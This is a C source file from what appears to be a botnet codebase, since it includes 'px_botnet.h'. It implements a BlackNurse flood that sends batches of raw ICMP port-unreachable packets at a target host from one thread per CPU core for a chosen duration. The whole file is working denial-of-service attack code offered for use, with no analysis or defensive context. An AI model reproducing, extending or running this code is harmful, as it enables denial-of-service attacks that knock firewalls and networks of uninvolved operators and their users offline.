#include "../../includes/px_botnet.h"

#define MAX_PACKETS 100

struct arginfo {
    char *host;
    int end_time;
};

unsigned short calculate_checksum(unsigned short *buffer, int size) {
    unsigned long cksum = 0;

    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }

    if (size) {
        cksum += *(unsigned char*)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

void *SEND_BLACKNURSE(void *arg) {
    struct arginfo *info = (struct arginfo *)arg;
    int s, i;
    struct addrinfo hints, *res;
    struct sockaddr_in *sin;
    struct mmsghdr msgs[MAX_PACKETS] = {0};
    struct iovec iovecs[MAX_PACKETS];
    char packets[MAX_PACKETS][60];
    time_t start_time, curr_time;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if (getaddrinfo(info->host, NULL, &hints, &res) != 0) {
        perror("getaddrinfo");
        return;
    }

    s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == -1) {
        perror("socket");
        freeaddrinfo(res);
        return;
    }


    for (i = 0; i < MAX_PACKETS; i++) {
        memset(packets[i], 0, 60);
        packets[i][20] = 0x03; // ICMP type = Destination Unreachable
        packets[i][21] = 0x03; // ICMP code = Port Unreachable
        // Calculate the checksum
        unsigned short *icmp_ptr = (unsigned short *)(packets[i] + 20);
        icmp_ptr[1] = 0; // Clear the checksum field
        unsigned short checksum = calculate_checksum(icmp_ptr, 40);
        icmp_ptr[1] = checksum; // Set the checksum field
        iovecs[i].iov_base = packets[i];
        iovecs[i].iov_len = 60;
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = res->ai_addr;
        msgs[i].msg_hdr.msg_namelen = res->ai_addrlen;
    }

    start_time = time(NULL);
    while (true) {
        if (sendmmsg(s, msgs, MAX_PACKETS, 0) == -1) {
            perror("sendmmsg");
            break;
        }

        curr_time = time(NULL); // Update the current time in each iteration

        if (curr_time >= start_time + info->end_time) {
            break; // Break the loop if the end time has been reached
        }
    }

    close(s);
    freeaddrinfo(res);
    return;
}

void BLACKNURSE(unsigned char *host, int seconds) {
    int thread_count = get_nprocs();
    if (thread_count <= 0) {
        perror("get_nprocs");
        return;
    }
    
    pthread_t threads[thread_count];
    struct arginfo info;

    info.host = host;
    info.end_time = seconds;

    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, SEND_BLACKNURSE, &info) != 0) {
            perror("pthread_create");
            return;
        }
    }

    for (int i = 0; i < thread_count; i++) {
        if (pthread_join(threads[i], NULL) != 0) {
            perror("pthread_join");
            return;
        }
    }
}